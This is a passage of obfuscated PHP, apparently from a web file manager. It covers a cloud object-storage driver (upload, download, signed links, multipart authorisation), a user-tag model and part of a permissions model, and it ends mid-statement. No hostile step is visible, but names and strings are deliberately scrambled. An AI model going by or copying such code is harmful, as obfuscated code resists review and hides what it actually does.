$eÆ‘Ğ”ÏĞ, $BĞ¦ò†Å¬Œ, $AÉ´ôˆ¨ ª, !0); } public function has($EÍ ´ºŞ”‡, $a–ñ–·×¡Ì = false, $AˆË…†‹ê = true) { goto F¢ÃŠÍÆŠ£; dêÊ Âˆ÷Ø: $dÖ¬¶Ôµ²Ï = null; $f–¶öÙÇÙ× = 500; $eÖé‘ƒ‡îØ = $eÎï¿ã¹İ£[8]; goto AòóÓÛØâ; A§ß›Š÷›„: return !1; goto bÔÒ…Úèà›; AòóÓÛØâ: $bªÔĞÅµ™² = $Cé½¨±“•Ï = array(); while (!0) { $bÉ¯ì¦Ò¹ = $this->listObjs($EÍ ´ºŞ”‡, $dÖ¬¶Ôµ²Ï, $f–¶öÙÇÙ×, $eÖé‘ƒ‡îØ); if (!$bÉ¯ì¦Ò¹) { break; } $dÖ¬¶Ôµ²Ï = $bÉ¯ì¦Ò¹[$eÎï¿ã¹İ£[200]]; $cËÚ–‡Ñ×¹ = $bÉ¯ì¦Ò¹[$eÎï¿ã¹İ£[196]]; $CĞÍÀ¡ŞŸ = $bÉ¯ì¦Ò¹[$eÎï¿ã¹İ£[199]]; if (empty($cËÚ–‡Ñ×¹) && empty($CĞÍÀ¡ŞŸ)) { break; } if (count($cËÚ–‡Ñ×¹) == 1 && $cËÚ–‡Ñ×¹[0][$eÎï¿ã¹İ£[28]] == $AÈ’÷Úã•“) { break; } if ($a–ñ–·×¡Ì) { if (count($cËÚ–‡Ñ×¹)) { $cËÚ–‡Ñ×¹ = array_column($cËÚ–‡Ñ×¹, $eÎï¿ã¹İ£[28]); $bªÔĞÅµ™² = array_merge($bªÔĞÅµ™², $cËÚ–‡Ñ×¹); } if (count($CĞÍÀ¡ŞŸ)) { $CĞÍÀ¡ŞŸ = array_column($CĞÍÀ¡ŞŸ, $eÎï¿ã¹İ£[28]); $Cé½¨±“•Ï = array_merge($Cé½¨±“•Ï, $CĞÍÀ¡ŞŸ); } if ($dÖ¬¶Ôµ²Ï === null) { break; } continue; } if ($AˆË…†‹ê) { if (!empty($cËÚ–‡Ñ×¹)) { if (count($cËÚ–‡Ñ×¹) > 1 || isset($cËÚ–‡Ñ×¹[0][$eÎï¿ã¹İ£[28]]) && $cËÚ–‡Ñ×¹[0][$eÎï¿ã¹İ£[28]] != $AÈ’÷Úã•“) { return !0; } } } else { if (!empty($CĞÍÀ¡ŞŸ)) { return !0; } } if ($dÖ¬¶Ôµ²Ï === null) { break; } } if ($a–ñ–·×¡Ì) { $bªÔĞÅµ™² = array_diff($bªÔĞÅµ™², array($AÈ’÷Úã•“)); $bªÔĞÅµ™² = count(array_unique($bªÔĞÅµ™²)); $Cé½¨±“•Ï = count(array_unique($Cé½¨±“•Ï)); return array($eÎï¿ã¹İ£[201] => $bªÔĞÅµ™², $eÎï¿ã¹İ£[202] => $Cé½¨±“•Ï); } goto A§ß›Š÷›„; F¢ÃŠÍÆŠ£: $eÎï¿ã¹İ£ =& $_SERVER[Š‰]; $EÍ ´ºŞ”‡ = trim($EÍ ´ºŞ”‡, $eÎï¿ã¹İ£[8]); $AÈ’÷Úã•“ = empty($EÍ ´ºŞ”‡) ? $eÎï¿ã¹İ£[33] : $EÍ ´ºŞ”‡ . $eÎï¿ã¹İ£[8]; goto dêÊ Âˆ÷Ø; bÔÒ…Úèà›: } public function listAll($D¶Ôäæ¾Æ¥) { $d°¾Ù¾«‰Ÿ =& $_SERVER[Š‰]; $D¢®´…æÁ = $this->fileList($D¶Ôäæ¾Æ¥, $d°¾Ù¾«‰Ÿ[33], !0); $cÙÆÍĞĞ¬ = array(); foreach ($D¢®´…æÁ[$d°¾Ù¾«‰Ÿ[73]] as $C¼†ÆÓ¡‚¬) { $cÙÆÍĞĞ¬[$C¼†ÆÓ¡‚¬[$d°¾Ù¾«‰Ÿ[28]]] = $C¼†ÆÓ¡‚¬[$d°¾Ù¾«‰Ÿ[77]]; } foreach ($D¢®´…æÁ[$d°¾Ù¾«‰Ÿ[74]] as $C¼†ÆÓ¡‚¬) { if (is_string($C¼†ÆÓ¡‚¬)) { $cÙÆÍĞĞ¬[$C¼†ÆÓ¡‚¬] = 0; } } return $this->listAllFiles($D¶Ôäæ¾Æ¥, array_keys($cÙÆÍĞĞ¬), $cÙÆÍĞĞ¬); } public function canRead($DèÓá˜‰¦Ÿ) { $eäÅ–íòó =& $_SERVER[Š‰]; $AóŒÖİŞ« = $this->client->getAccessControlPolicy($this->bucket, $DèÓá˜‰¦Ÿ); if (!$AóŒÖİŞ«) { return !1; } return in_array($AóŒÖİŞ«, array($eäÅ–íòó[203], $eäÅ–íòó[204], $eäÅ–íòó[205])) ? !0 : !1; } public function canWrite($e‡ì„Ø ø) { $eö¼õä‚‘½ =& $_SERVER[Š‰]; $cá·‹ÑÅ¯Á = $this->client->getAccessControlPolicy($this->bucket, $e‡ì„Ø ø); if (!$cá·‹ÑÅ¯Á) { return !1; } return in_array($cá·‹ÑÅ¯Á, array($eö¼õä‚‘½[203], $eö¼õä‚‘½[204])) ? !0 : !1; } public function getContent($A§ë»¥ÁÎ‚) { return $this->client->getObject($this->bucket, $A§ë»¥ÁÎ‚); } public function setContent($C¶Ğ©Öí®Œ, $B©¸™‘†Ú‡ = '', $F™îáÖ¾ ¨ = false) { goto D±ÈÈåº; D±ÈÈåº: $bŠ£éš¢õÇ =& $_SERVER[Š‰]; $C¶Ğ©Öí®Œ = $F™îáÖ¾ ¨ ? trim($C¶Ğ©Öí®Œ, $bŠ£éš¢õÇ[8]) . $bŠ£éš¢õÇ[8] : $C¶Ğ©Öí®Œ; $fÜå¥›æ– = get_file_mime(get_path_ext($C¶Ğ©Öí®Œ)); goto EÒ±›‡‰ä; EÒ±›‡‰ä: $dÖÎŒÖïÂ = $this->client->putObject($B©¸™‘†Ú‡, $this->bucket, $C¶Ğ©Öí®Œ, $bŠ£éš¢õÇ[191], array(), $fÜå¥›æ–); if (!$dÖÎŒÖïÂ) { return !1; } if ($F™îáÖ¾ ¨) { return !0; } goto BŒ§ƒò©æ³; BŒ§ƒò©æ³: $this->cacheMethod(null, null); $dÖÎŒÖïÂ = $this->copyFile($C¶Ğ©Öí®Œ, $C¶Ğ©Öí®Œ, array($bŠ£éš¢õÇ[206] => $dÖÎŒÖïÂ[$bŠ£éš¢õÇ[207]])); return $dÖÎŒÖïÂ ? !0 : !1; goto E¨ç¿äÒõ‡; E¨ç¿äÒõ‡: } public function fileSubstr($D†‰‚í¥›ã, $Cù‰áÁÓİÍ, $Bœ†ÕÎ‰œö) { $B†÷Â¥› … = $Cù‰áÁÓİÍ + $Bœ†ÕÎ‰œö - 1; return $this->client->getObject($this->bucket, $D†‰‚í¥›ã, array($_SERVER[Š‰][208] => "\142\x79\x74\x65\163\x3d{$Cù‰áÁÓİÍ}\x2d{$B†÷Â¥› …}")); } public function upload($Aä—ğñÄô‡, $A™İÄ¿¯µ¬, $dÑÚ¿³ó¦  = false, $EÚ¸‡ÑÎô = REPEAT_REPLACE) { $e¯×‹œğò =& $_SERVER[Š‰]; $cÆé˜Úñİ = array($e¯×‹œğò[206] => @md5_file($A™İÄ¿¯µ¬)); $EóŒ„Îê«¹ = array($e¯×‹œğò[209] => get_file_mime(get_path_ext($Aä—ğñÄô‡))); if (IO::size($A™İÄ¿¯µ¬) <= 1024 * 1024 * 200) { $E‚³ªãèµš = $this->client->putObjectFile($A™İÄ¿¯µ¬, $this->bucket, $Aä—ğñÄô‡, $e¯×‹œğò[191], $cÆé˜Úñİ, $EóŒ„Îê«¹); return !empty($E‚³ªãèµš) ? $this->getPathOuter($Aä—ğñÄô‡) : !1; } $a­ÂÄääì† = $this->client->multiUploadObject($A™İÄ¿¯µ¬, $this->bucket, trim($Aä—ğñÄô‡, $e¯×‹œğò[8]), $cÆé˜Úñİ, $EóŒ„Îê«¹); return $a­ÂÄääì† ? $this->getPathOuter($Aä—ğñÄô‡) : !1; } public function download($dØ§İÌ¿, $E¸Ì ğ±²ù) { if (!@is_dir($this->pathFather($E¸Ì ğ±²ù)) && !IO::mkdir($this->pathFather($E¸Ì ğ±²ù))) { return !1; } $AÙìŠ°ñ¢í = $this->client->getObject($this->bucket, $dØ§İÌ¿, array(), $E¸Ì ğ±²ù); return $AÙìŠ°ñ¢í !== !1 ? $E¸Ì ğ±²ù : !1; } public function link($fõ¾†•í, $CÂÁŠãàÈ = array()) { $eÏ“îÜ› =& $_SERVER[Š‰]; if ($this->signVer == $eÏ“îÜ›[210]) { return $this->client->getAuthenticatedURL($this->bucket, $fõ¾†•í, 3600 * 12, $CÂÁŠãàÈ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($fõ¾†•í, $eÏ“îÜ›[8]), 3600 * 12, $this->region, array(), !0, $CÂÁŠãàÈ); } public function fileOut($Fƒ‡ó¤÷É×, $Aø£‚âæ¸Ü = false, $C»¡ƒ¯Åó = false, $cè–«â¦„ = '') { goto d›‡ù¤‰œí; F‚Ò÷‚ŸØ: $EßÏí®¡¸Ü = get_file_mime(get_path_ext($C»¡ƒ¯Åó)); if ($EßÏí®¡¸Ü == $aÕÙåÕ½£[211]) { return parent::fileOut($Fƒ‡ó¤÷É×, $Aø£‚âæ¸Ü, $C»¡ƒ¯Åó, $cè–«â¦„); } $Aø£‚âæ¸Ü = $Aø£‚âæ¸Ü ? $aÕÙåÕ½£[212] : $aÕÙåÕ½£[213]; goto e›œÉâ§Ï; d›‡ù¤‰œí: $aÕÙåÕ½£ =& $_SERVER[Š‰]; if ($this->isFileOutServer()) { return $this->fileOutServer($Fƒ‡ó¤÷É×, $Aø£‚âæ¸Ü, $C»¡ƒ¯Åó, $cè–«â¦„); } if (!$C»¡ƒ¯Åó) { $C»¡ƒ¯Åó = $this->pathThis($Fƒ‡ó¤÷É×); } goto F‚Ò÷‚ŸØ; e›œÉâ§Ï: $fÛÅõ•‘Ï = array($aÕÙåÕ½£[214] => $Aø£‚âæ¸Ü . $aÕÙåÕ½£[215] . rawurlencode($C»¡ƒ¯Åó), $aÕÙåÕ½£[216] => $EßÏí®¡¸Ü); $C¦“Á×ˆ› = $this->link($Fƒ‡ó¤÷É×, $fÛÅõ•‘Ï); $this->fileOutLink($C¦“Á×ˆ›); goto FÚ­ã­ôÏô; FÚ­ã­ôÏô: } public function fileOutServer($C ÷òšÀé, $bŒ‘’å¡‰® = false, $CòÏªÃß¡ã = false, $a®‘ß—öÜÀ = '') { parent::fileOut($C ÷òšÀé, $bŒ‘’å¡‰®, $CòÏªÃß¡ã, $a®‘ß—öÜÀ); } public function fileOutImageServer($D”Ó¦ééÚÌ, $Bæ¢ÊÉÈ¯Ú = 250) { parent::fileOutImage($D”Ó¦ééÚÌ, $Bæ¢ÊÉÈ¯Ú); } public function hashMd5($E…ÇåğëÈç, $DÕ‹óé´Ìœ = '') { $d­¨÷Ô¡ =& $_SERVER[Š‰]; $A»áÛæ  = $this->objectMeta($E…ÇåğëÈç); if (!$A»áÛæ ) { return !1; } $DÕ‹óé´Ìœ = $DÕ‹óé´Ìœ ? $DÕ‹óé´Ìœ : _get($A»áÛæ , $d­¨÷Ô¡[217]); $DÕ‹óé´Ìœ = $DÕ‹óé´Ìœ ? $DÕ‹óé´Ìœ : _get($A»áÛæ , $d­¨÷Ô¡[207], $d­¨÷Ô¡[33]); return $DÕ‹óé´Ìœ; } public function uploadFormData($e¡³æŸ‹æ·, $fÛæ¶áÆ‚ = 3600) { $DïõÇÏÓ¢È =& $_SERVER[Š‰]; $Eñèƒ×ÙÀ = $this->pathFather($e¡³æŸ‹æ·); $aêæ°¾Í¬ = $this->client->getHttpUploadPostParams($this->bucket, $Eñèƒ×ÙÀ, $DïõÇÏÓ¢È[191], $fÛæ¶áÆ‚); return array_merge((array) $aêæ°¾Í¬, array($DïõÇÏÓ¢È[175] => $this->getHost())); } public function multiUploadFormData($Eá‹çÖ†Ş¿, $fŞøÛÈ¨ª = 3600) { $Aá’¥•Ğ¦ =& $_SERVER[Š‰]; $a„ª…‘‹¥Í = gmdate($Aá’¥•Ğ¦[218]); $d‹ù…†Š÷ = array(); $d©ãÎ£Ç…… = $this->client->getUploadId($this->bucket, $Eá‹çÖ†Ş¿, $d‹ù…†Š÷); if (!$d©ãÎ£Ç……) { return !1; } return array($Aá’¥•Ğ¦[219] => $d©ãÎ£Ç……, $Aá’¥•Ğ¦[175] => $this->getHost() . $Aá’¥•Ğ¦[8] . $this->pathEncode($Eá‹çÖ†Ş¿), $Aá’¥•Ğ¦[220] => $a„ª…‘‹¥Í, $Aá’¥•Ğ¦[92] => $Eá‹çÖ†Ş¿); } public function multiUploadAuthData($a˜”çŒ‰¾Í, $cé˜¦áäù‘ = array()) { goto AÂĞ‹öƒ°£; A½–Ã‹‘‰: $BìäÌ„­ = $cé˜¦áäù‘[$b¯ÄåŒ¥ï«[92]]; unset($cé˜¦áäù‘[$b¯ÄåŒ¥ï«[92]]); if (isset($cé˜¦áäù‘[$b¯ÄåŒ¥ï«[221]])) { $cé˜¦áäù‘[$b¯ÄåŒ¥ï«[220]] = $DŠô³›„¼‹; return $this->listUploadParts($BìäÌ„­, $cé˜¦áäù‘); } goto f¾ï…çŠõ…; f¾ï…çŠõ…: $BéáÚ«îî’ = array($b¯ÄåŒ¥ï«[222], $b¯ÄåŒ¥ï«[33], $b¯ÄåŒ¥ï«[118], $b¯ÄåŒ¥ï«[33], "\x78\x2d\141\155\x7a\55\144\x61\x74\x65\72{$DŠô³›„¼‹}", $b¯ÄåŒ¥ï«[8] . $this->bucket . $b¯ÄåŒ¥ï«[8] . $this->pathEncode($BìäÌ„­) . $DŸø¤¾÷‰); if (strpos($DŸø¤¾÷‰, $b¯ÄåŒ¥ï«[223]) === 0) { $BéáÚ«îî’[0] = $b¯ÄåŒ¥ï«[224]; } if (isset($cé˜¦áäù‘[$b¯ÄåŒ¥ï«[225]]) && $cé˜¦áäù‘[$b¯ÄåŒ¥ï«[225]] == $b¯ÄåŒ¥ï«[226]) { $BéáÚ«îî’[0] = $b¯ÄåŒ¥ï«[226]; } goto c¤Á’Üö; c¤Á’Üö: $FŒ™åì¢ù¸ = implode($b¯ÄåŒ¥ï«[227], $BéáÚ«îî’); $FÒ³‰¶¯Ÿõ = base64_encode(hash_hmac($b¯ÄåŒ¥ï«[228], $FŒ™åì¢ù¸, $this->secret, !0)); $BÒˆ•áÑ = $b¯ÄåŒ¥ï«[229] . $this->accessKey . $b¯ÄåŒ¥ï«[4] . $FÒ³‰¶¯Ÿõ; goto b¹ âôÓ´; AÂĞ‹öƒ°£: $b¯ÄåŒ¥ï« =& $_SERVER[Š‰]; $DŠô³›„¼‹ = isset($cé˜¦áäù‘[$b¯ÄåŒ¥ï«[220]]) ? $cé˜¦áäù‘[$b¯ÄåŒ¥ï«[220]] : gmdate($b¯ÄåŒ¥ï«[218]); $DŸø¤¾÷‰ = isset($cé˜¦áäù‘[$b¯ÄåŒ¥ï«[167]]) ? $cé˜¦áäù‘[$b¯ÄåŒ¥ï«[167]] : $b¯ÄåŒ¥ï«[33]; goto A½–Ã‹‘‰; b¹ âôÓ´: if (strpos($DŸø¤¾÷‰, $b¯ÄåŒ¥ï«[223]) === 0) { return array($b¯ÄåŒ¥ï«[230] => $BÒˆ•áÑ, $b¯ÄåŒ¥ï«[220] => $DŠô³›„¼‹); } return $BÒˆ•áÑ; goto c²¦ÇÑÄİğ; c²¦ÇÑÄİğ: } public function listUploadParts($A›äôù£Ó, $E§—Æ¦¯Ó = array()) { goto Föóàƒ—Ş†; Föóàƒ—Ş†: $BÜÅ¸Œâ™– =& $_SERVER[Š‰]; $BâÅø‚ğÀ = str_replace($BÜÅ¸Œâ™–[231], $BÜÅ¸Œâ™–[33], $E§—Æ¦¯Ó[$BÜÅ¸Œâ™–[167]]); $A«óº­ó¡ = $this->client->listParts($this->bucket, $A›äôù£Ó, $BâÅø‚ğÀ); goto bÉšÔÕì; bÉšÔÕì: if (!$A«óº­ó¡) { return !1; } unset($E§—Æ¦¯Ó[$BÜÅ¸Œâ™–[221]], $E§—Æ¦¯Ó[$BÜÅ¸Œâ™–[225]]); $E§—Æ¦¯Ó[$BÜÅ¸Œâ™–[92]] = $A›äôù£Ó; goto fö™·©ßÑ‡; fö™·©ßÑ‡: $Eî„£Æ‹¶â = $this->multiUploadAuthData($A›äôù£Ó, $E§—Æ¦¯Ó); if (empty($Eî„£Æ‹¶â)) { return !1; } return array($BÜÅ¸Œâ™–[230] => $Eî„£Æ‹¶â, $BÜÅ¸Œâ™–[220] => $E§—Æ¦¯Ó[$BÜÅ¸Œâ™–[220]], $BÜÅ¸Œâ™–[232] => $A«óº­ó¡); goto EÌ·íˆ÷ƒ; EÌ·íˆ÷ƒ: } public function getHost() { return parent::getHost() . $_SERVER[Š‰][8] . $this->bucket; } public function size($fÖ™Ğ¾””) { $C…ŞÔ“Ñ×¦ = $this->objectMeta($fÖ™Ğ¾””); return $C…ŞÔ“Ñ×¦ ? $C…ŞÔ“Ñ×¦[$_SERVER[Š‰][77]] : 0; } public function info($cÕ‚«‚¸š) { if ($this->isFolder($cÕ‚«‚¸š)) { return $this->folderInfo($cÕ‚«‚¸š); } else { if ($this->isFile($cÕ‚«‚¸š)) { return $this->fileInfo($cÕ‚«‚¸š); } } return !1; } public function exist($bÇï—¸áòÚ) { return $this->isFile($bÇï—¸áòÚ) || $this->isFolder($bÇï—¸áòÚ); } public function isFile($cæğÀá›¦¨) { return !$this->isFolder($cæğÀá›¦¨) && $this->objectMeta($cæğÀá›¦¨); } public function isFolder($F¿¥¾»ÀÙ ) { return $this->cacheMethod($_SERVER[Š‰][197], $F¿¥¾»ÀÙ ); } protected function objectMeta($Dæ„™×¾ÂÃ) { return $this->cacheMethod($_SERVER[Š‰][198], $Dæ„™×¾ÂÃ); } protected function _objectMeta($CŸ»÷ ø‚¨) { $aÏÓ½Ÿ§Ã¦ =& $_SERVER[Š‰]; $CŸ»÷ ø‚¨ = rtrim($CŸ»÷ ø‚¨, $aÏÓ½Ÿ§Ã¦[8]); try { $F¥ó½—Ç µ = $this->client->getObjectInfo($this->bucket, $CŸ»÷ ø‚¨); if (!isset($F¥ó½—Ç µ[$aÏÓ½Ÿ§Ã¦[217]]) && isset($F¥ó½—Ç µ[$aÏÓ½Ÿ§Ã¦[233]])) { $F¥ó½—Ç µ[$aÏÓ½Ÿ§Ã¦[217]] = $F¥ó½—Ç µ[$aÏÓ½Ÿ§Ã¦[233]]; } } catch (Exception $Dƒ½®¦¨Ü•) { $F¥ó½—Ç µ = !1; } if (!$F¥ó½—Ç µ) { } return $F¥ó½—Ç µ; } protected function _isFolder($BÍõ®–§æğ) { goto bé·˜¯‰ƒ—; bé·˜¯‰ƒ—: $aå‘¿½½Çå =& $_SERVER[Š‰]; $BÍõ®–§æğ = rtrim($BÍõ®–§æğ, $aå‘¿½½Çå[8]); if ($BÍõ®–§æğ == $aå‘¿½½Çå[33] || $BÍõ®–§æğ == $aå‘¿½½Çå[8]) { return !0; } goto e¬¤ÈÔ…‹Á; e¬¤ÈÔ…‹Á: $EÕ‚ÙšÇ«Ş = $this->client->getBucket($this->bucket, $BÍõ®–§æğ, null, 1); if (empty($EÕ‚ÙšÇ«Ş[$aå‘¿½½Çå[196]])) { return !1; } $d”²—£ªòÓ = $EÕ‚ÙšÇ«Ş[$aå‘¿½½Çå[196]][0][$aå‘¿½½Çå[28]]; goto bòØˆ†¥ò•; bòØˆ†¥ò•: if (substr($d”²—£ªòÓ, -1) == $aå‘¿½½Çå[8]) { return !0; } if (get_path_this($d”²—£ªòÓ) == get_path_this($BÍõ®–§æğ)) { return !1; } return !0; goto a’¼İ±ƒ˜; a’¼İ±ƒ˜: } } define($_SERVER[Š‰][234], 1); goto bšä¤Â´Ú; bšä¤Â´Ú: define($_SERVER[Š‰][235], 2); define($_SERVER[Š‰][236], 3); define($_SERVER[Š‰][237], 1); goto AŠ·øÏ¬Ÿ; cÚƒ†ê™: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\x72\56\164\141\147\x4c\x69\x73\164"; public $modelType = "\125\163\145\162\x4f\160\x74\151\x6f\156"; public $field = array("\156\141\x6d\x65", "\x73\164\171\154\x65", "\x73\x6f\x72\x74"); public function listData($A°íİ¬¢­ = false, $fØï½˜İ¹ = "\163\x6f\x72\164", $dÎÏ÷øš•ª = false) { return parent::listData($A°íİ¬¢­, $fØï½˜İ¹, $dÎÏ÷øš•ª); } public function remove($eè·½ß±ÀŸ) { return parent::remove($eè·½ß±ÀŸ); } public function add($C‘ºª¤Íß¼, $e®‹‚™©’š = "\x6c\x61\142\x65\x6c\x2d\147\162\145\171\x2d\x6e\157\x72\155\x61\x6c") { $Cƒ§ß¤‘Øù =& $_SERVER[Š‰]; if ($this->findByName($C‘ºª¤Íß¼)) { return !1; } $BÍÒñˆôÄ‚ = array($Cƒ§ß¤‘Øù[407] => $C‘ºª¤Íß¼, $Cƒ§ß¤‘Øù[458] => $e®‹‚™©’š, $Cƒ§ß¤‘Øù[1667] => $this->getSort($Cƒ§ß¤‘Øù[254]) + 1); return parent::insert($BÍÒñˆôÄ‚); } public function update($D»İ£§µôÈ, $d×”á¿›Í‰) { $AÌ„ ­ÜÌî =& $_SERVER[Š‰]; $b–Ï©Üù³ = $this->listData($D»İ£§µôÈ); $fä³òî¦Í = $this->findByName($d×”á¿›Í‰[$AÌ„ ­ÜÌî[28]]); if (!$b–Ï©Üù³ || $fä³òî¦Í && $fä³òî¦Í[$AÌ„ ­ÜÌî[388]] != $b–Ï©Üù³[$AÌ„ ­ÜÌî[388]]) { return !1; } return parent::update($D»İ£§µôÈ, $d×”á¿›Í‰); } public function moveTop($b•¯·‚¬×ñ) { $a¼­¨ïŞœ =& $_SERVER[Š‰]; $b Û‚¸Ùä¦ = parent::listData(); $A»‰Ğ‘¶§ò = $this->getSort($a¼­¨ïŞœ[253]); foreach ($b Û‚¸Ùä¦ as &$c«‰ª¼„À¼) { if ($c«‰ª¼„À¼[$a¼­¨ïŞœ[388]] == $b•¯·‚¬×ñ) { $c«‰ª¼„À¼[$a¼­¨ïŞœ[1686]] = $A»‰Ğ‘¶§ò; continue; } $c«‰ª¼„À¼[$a¼­¨ïŞœ[1686]] += 1; } unset($c«‰ª¼„À¼); return parent::resetData($b Û‚¸Ùä¦); } public function moveBottom($E¤¾…šÏ×…) { $F’Ù¬œ¢¤“ =& $_SERVER[Š‰]; $Få‚‘ ‚Õ = $this->getSort($F’Ù¬œ¢¤“[254]) + 1; return parent::update($E¤¾…šÏ×…, array($F’Ù¬œ¢¤“[1686] => $Få‚‘ ‚Õ)); } public function resetSort($C´¯²¯²î) { goto cªÍ†…Õ„Ó; cªÍ†…Õ„Ó: $AÅ²æ°Û„” =& $_SERVER[Š‰]; $e½†÷‘èæŠ = array(); $C´¯²¯²î = is_array($C´¯²¯²î) ? $C´¯²¯²î : array(); goto f©ÑÔÇ¼Ø; f©ÑÔÇ¼Ø: for ($Añ†ÛÕèÃˆ = 0; $Añ†ÛÕèÃˆ < count($C´¯²¯²î); $Añ†ÛÕèÃˆ++) { $e½†÷‘èæŠ[$C´¯²¯²î[$Añ†ÛÕèÃˆ] . $AÅ²æ°Û„”[33]] = $Añ†ÛÕèÃˆ + 1; } $D‘°ó †‹ = parent::listData(); foreach ($D‘°ó †‹ as &$CÂãÀ“°œÑ) { $AßŸ‹¢»“÷ = $e½†÷‘èæŠ[$CÂãÀ“°œÑ[$AÅ²æ°Û„”[388]]]; $CÂãÀ“°œÑ[$AÅ²æ°Û„”[1686]] = $AßŸ‹¢»“÷ ? $AßŸ‹¢»“÷ : $CÂãÀ“°œÑ[$AÅ²æ°Û„”[1686]]; } goto aôâ¢ÏÈÎ›; aôâ¢ÏÈÎ›: unset($CÂãÀ“°œÑ); return parent::resetData($D‘°ó †‹); goto FÍäÅñ’ïˆ; FÍäÅñ’ïˆ: } private function getSort($Aî–‚ƒ»») { $Bó»†ÉÜ¥¹ =& $_SERVER[Š‰]; $c‰«Æ‰ùÆ² = parent::listData(); $DÖ÷“õ¦Í— = array_to_keyvalue($c‰«Æ‰ùÆ², $Bó»†ÉÜ¥¹[33], $Bó»†ÉÜ¥¹[1686]); if (!$DÖ÷“õ¦Í—) { $DÖ÷“õ¦Í— = array(0); } $DµİÄ‰ÂŠˆ = $Aî–‚ƒ»» == $Bó»†ÉÜ¥¹[254] ? max($DÖ÷“õ¦Í—) : min($DÖ÷“õ¦Í—); return intval($DµİÄ‰ÂŠˆ); } } goto fËÂÃÁ›Õ¥; c¶µªÃìºÓ: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\165\162\x63\145\137\x61\x75\164\150"; public function getAuth($D’ îµœÜ) { goto eÚêôåêÄÍ; A±±ÎÔİŒ­: array_multisort($B¸²ÁÆ±È’, SORT_DESC, $EŒÏ‘”Û™¨); return $EŒÏ‘”Û™¨; goto aÚ­ÏÛ´ŸÂ; eÚêôåêÄÍ: $d·ÃÄËô =& $_SERVER[Š‰]; $D¸ ÊÂÖŸ = $this->sourceAuthSelect($D’ îµœÜ); $EŒÏ‘”Û™¨ = array(); goto EŞÖ›Â¦‹Î; EŞÖ›Â¦‹Î: $B¸²ÁÆ±È’ = array(); $EèÑšŠõ… = 2 << 25; foreach ($D¸ ÊÂÖŸ as $dõŒÊ‡ìÒ) { goto C¸»œô¨â‚; fæÅÂ£¦ö: $F³½›‰Öïœ = 0; if ($dõŒÊ‡ìÒ[$d·ÃÄËô[398]] == SourceModel::TYPE_GROUP) { $F³½›‰Öïœ = $EèÑšŠõ… * 2; } if ($dõŒÊ‡ìÒ[$d·ÃÄËô[398]] == SourceModel::TYPE_USER) { $F³½›‰Öïœ = $EèÑšŠõ…; } goto cÒÆ©éÔäí; C¸»œô¨â‚: $DÌ‘ŒÎ–ã = Model($d·ÃÄËô[1831])->listData($dõŒÊ‡ìÒ[$d·ÃÄËô[1759]]); if (!$DÌ‘ŒÎ–ã) { continue; } $EŒÏ‘”Û™¨[] = $dõŒÊ‡ìÒ; goto fæÅÂ£¦ö; cÒÆ©éÔäí: if ($dõŒÊ‡ìÒ[$d·ÃÄËô[398]] == SourceModel::TYPE_USER && $dõŒÊ‡ìÒ[$d·ÃÄËô[478]] == $d·ÃÄËô[491]) { $F³½›‰Öïœ = 0; } $B¸²ÁÆ±È’[] = $DÌ‘ŒÎ–ã[$d·ÃÄËô[400]] + $F³½›‰Öïœ; goto EïÏÈÂª‘î; EïÏÈÂª‘î: } goto A±±ÎÔİŒ­; aÚ­ÏÛ´ŸÂ: } public function sourceAuthSelect($C·Ã¤Ûñ) { goto bğØõ¢Œ‡; FéæÒâ²ìŸ: if ($Aõ¯¯ÂÏÕ) { $C·Ã¤Ûñ = array($C·Ã¤Ûñ); } $D¥ä˜‘ÄÛõ = array(); foreach ($C·Ã¤Ûñ as $Aó¬ÂšÒÜ‚) { if (isset($Eİ‡ï²İÖë[$Aó¬ÂšÒÜ‚])) { $D¥ä˜‘ÄÛõ[$Aó¬ÂšÒÜ‚] = $Eİ‡ï²İÖë[$Aó¬ÂšÒÜ‚]; } } goto CØğ†‰Ü…š; AÍ‘ôã: if ($Aõ¯¯ÂÏÕ) { return $b¼¬™¹³Õ; } return $bÃóÎ²ŸïÙ; goto D¡ğ……¼å; CØğ†‰Ü…š: if (count($D¥ä˜‘ÄÛõ) == count($C·Ã¤Ûñ)) { return $Aõ¯¯ÂÏÕ ? $D¥ä˜‘ÄÛõ[$C·Ã¤Ûñ[0]] : $D¥ä˜‘ÄÛõ; } $A›â›ö­© = $c‡ê²„ßÍğ[1832]; $F†§„˜¨¯¿ = array($c‡ê²„ßÍğ[390] => array($c‡ê²„ßÍğ[7], $C·Ã¤Ûñ)); goto C‘…íÀ–ˆŸ; bğØõ¢Œ‡: $c‡ê²„ßÍğ =& $_SERVER[Š‰]; static $Eİ‡ï²İÖë = array(); $Aõ¯¯ÂÏÕ = is_array($C·Ã¤Ûñ) ? !1 : !0; goto FéæÒâ²ìŸ; C‘…íÀ–ˆŸ: $b¼¬™¹³Õ = $this->field($A›â›ö­©)->order($c‡ê²„ßÍğ[388])->where($F†§„˜¨¯¿)->select(); $bÃóÎ²ŸïÙ = array_to_keyvalue_group($b¼¬™¹³Õ, $c‡ê²„ßÍğ[390]); foreach ($C·Ã¤Ûñ as $Aó¬ÂšÒÜ‚) { $Eİ‡ï²İÖë[$Aó¬ÂšÒÜ‚] = $bÃóÎ²ŸïÙ[$Aó¬ÂšÒÜ‚] ? $bÃóÎ²ŸïÙ[$Aó¬ÂšÒÜ‚] : array(); } goto AÍ‘ôã; D¡ğ……¼å: } public function setAuth($BÍÒ—Ä¦ŒÄ, $BŒ¯ä™æÕÚ) { goto e§ƒ¾õƒĞÏ; C×§Üâß§’: return !0; goto Aª…ºµ¼ˆ‡; c²Ë³Ù´å³: foreach ($BŒ¯ä™æÕÚ as $f“ô†è–ÔŸ) { if (!in_array($f“ô†è–ÔŸ[$Fµ¿×õÙª÷[398]], $dùğ¤ïˆ»ï)) { show_json(LNG($Fµ¿×õÙª÷[1833]), !1); } if ($EÉ‰³á‚ÈŞ != $B™È¤‡öî¤) { if ($f“ô†è–ÔŸ[$Fµ¿×õÙª÷[398]] == SourceModel::TYPE_GROUP) { } if ($f“ô†è–ÔŸ[$Fµ¿×õÙª÷[478]] != 0 && !in_array($f“ô†è–ÔŸ[$Fµ¿×õÙª÷[478]], $AĞ‹ò‡)) { } } if ($f“ô†è–ÔŸ[$Fµ¿×õÙª÷[478]] == 0) { $f“ô†è–ÔŸ[$Fµ¿×õÙª÷[398]] = SourceModel::TYPE_USER; } $E„íùîùì[] = array($Fµ¿×õÙª÷[390] => 